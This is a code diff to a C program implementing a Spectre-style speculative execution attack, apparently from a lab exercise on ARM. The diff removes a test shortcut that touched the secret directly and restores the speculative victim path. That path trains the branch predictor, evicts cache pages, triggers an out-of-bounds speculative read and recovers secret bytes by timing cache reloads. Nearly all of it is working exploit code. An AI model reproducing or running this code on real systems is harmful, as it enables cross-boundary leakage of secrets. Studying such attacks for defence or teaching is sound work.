@@ -16,7 +16,7 @@
 #define SYMBOL_CNT (1 << (sizeof(char) * 8))
 
 // ====== The evil attacker code ======
-#define REP 200 // Number of repetitions to de-noise the channel
+#define REP 100 // Number of repetitions to de-noise the channel
 #define TRAINING_EPOCH 16 // 15 in-bound accesses then 1 out-of-bound access
 #define BUF_SIZE 20
 
@@ -118,65 +118,49 @@ void naive_attacker() {
     /* END SAVE HERE */
 
 
-    // Set to 1 to bypass speculation and directly touch the secret’s page.
-// Set to 0 to use the normal speculative victim path.
-#ifndef BYPASS_VICTIM_TEST
-#define BYPASS_VICTIM_TEST 1
-#endif
-
-for (size_t c = 0; c < strlen(secret); c++) {
+    for (size_t c = 0; c < strlen(secret); c++) {
 
     for (size_t r = 0; r < REP; r++) {
 
-#if BYPASS_VICTIM_TEST
-        // -------- BYPASS: simulate the victim by directly touching the secret page --------
-        // 1) Evict probe lines before the "victim" access
-        evict_by_sweep(evict_buf, evict_bytes);
-        __asm__ __volatile__("dsb ish" ::: "memory");
-        ISB();
-
-        // 2) Touch the page corresponding to the actual secret byte
-        unsigned char secret_val = (unsigned char)secret[c];
-        volatile uint8_t *hot = (volatile uint8_t *)(pages + stride * secret_val);
-        (void)*hot;
-
-        // 3) Serialize before measurement
-        __asm__ __volatile__("dsb ish" ::: "memory");
-        ISB();
-
-#else
-        // -------- SPECULATIVE victim path (your original training/attack) --------
+        // -------- Training phase --------
         for (size_t t = 0; t < TRAINING_EPOCH; t++) {
             bool is_attack = (t % TRAINING_EPOCH == TRAINING_EPOCH - 1);
             size_t index = csel(malicious_index + c, 0, is_attack);
 
-            // Evict BEFORE victim (soft "flush"), and keep bounds value cold
+            // Evict all probe pages BEFORE the victim — this is your "flush".
             evict_by_sweep(evict_buf, evict_bytes);
+
+            // Make sure the bounds variable is cold so branch mispredicts.
             touch((void *)&array_size);
+
+            // Memory barriers: ensure eviction is complete before victim.
             __asm__ __volatile__("dsb ish" ::: "memory");
             ISB();
 
-            // Run victim; make result observable to block DCE
-            int leak = naive_victim((uint8_t *)pages, index, stride);
+            // Run victim. Make sure load cannot be optimized away.
+            int leak = naive_victim(pages, index, stride);
             __asm__ __volatile__("" :: "r"(leak) : "memory");
-        }
-#endif
 
-        // -------- Measurement: reload timings (no eviction/touches before this) --------
+            // No eviction after this point — the victim's speculative access
+            // may have brought one page back into the cache.
+        }
+
+        // -------- Measurement phase --------
+        // Time reloads *after* victim, without touching the cache before.
         for (size_t i = 0; i < SYMBOL_CNT; i++) {
             size_t idx = (i * 167 + 13) % SYMBOL_CNT;
-            uint8_t *ptr = pages + (stride * idx);
+            uint8_t *ptr = pages + stride * idx;
+
+            // Count as a "hit" if access latency is below threshold.
             hits[idx] += (timer_time_maccess(ptr) < threshold);
         }
     }
 
-
-
-
-    // -------- Decode the recovered character --------
+    // -------- Decode one recovered character --------
     decode_flush_reload_state(&buf[c], hits, SYMBOL_CNT);
     memset(hits, 0, sizeof(hits));
-    }
+}
+
 
     printf("Recovered secret: \"%s\"\n", buf);
     munmap(pages, PAGE_SIZE * SYMBOL_CNT);
